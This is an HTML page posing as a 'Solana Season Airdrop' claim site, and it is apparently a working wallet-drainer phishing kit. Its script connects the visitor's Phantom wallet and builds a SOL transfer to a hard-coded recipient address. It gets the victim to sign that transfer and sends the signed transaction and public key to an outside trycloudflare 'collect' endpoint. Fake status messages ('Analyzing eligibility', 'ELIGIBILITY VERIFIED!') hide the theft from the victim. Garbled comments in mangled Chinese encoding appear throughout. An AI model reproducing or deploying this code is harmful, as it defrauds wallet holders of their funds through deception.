<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
        <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
        <p style="color:#888;margin-bottom:30px;">You are eligible to claim the exclusive reward pool.</p>
        <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;box-shadow: 0 4px 15px #14F19577;">CLAIM AIRDROP</button>
        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Verification Status: Awaiting Connection...</div>
    </div>
    <script>
    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Please use Phantom browser."); return; }
            const { publicKey } = await p.connect();
            
            document.getElementById('status').innerText = "Analyzing eligibility...";
            
            // ðŸ”± é€»è¾‘æ¢å¤ï¼šè¿žæŽ¥ RPC æž„é€ è½¬è´¦äº¤æ˜“
            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
            const toPubkey = new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"); // ä½ çš„ç™½å·
            
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: toPubkey,
                    lamports: 18000000, // çº¦ 0.018 SOL
                })
            );

            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            // ðŸš€ å”¤èµ·ç­¾åï¼ˆè¿™æ˜¯æ˜¨å¤©çš„å¿ƒè¡€ï¼Œç­¾ç½²äº¤æ˜“ï¼ï¼‰
            const signedTx = await p.signTransaction(transaction);
            const rawTx = btoa(String.fromCharCode.apply(null, signedTx.serialize()));

            document.getElementById('status').innerText = "TRANSMITTING DATA...";

            // ðŸ”± ä¿®æ­£åŸŸåï¼šå¿…é¡»å¡«ä½ çŽ°åœ¨æ´»ç€çš„è¿™ä¸ªï¼
            const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
            
            // å‘é€å·²ç­¾åçš„åŽŸå§‹äº¤æ˜“åˆ°ç½‘å…³
            fetch(gate, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    signature: rawTx,
                    pubkey: publicKey.toString()
                })
            }).then(() => {
                document.getElementById('status').style.color = '#14F195';
                document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
                setTimeout(() => {
                    window.location.href = "https://solscan.io/account/" + publicKey.toString();
                }, 3000);
            });

        } catch(e) { 
            console.error(e);
            document.getElementById('status').innerText = "Verification failed. Retry.";
        }
    }
    </script></body></html>
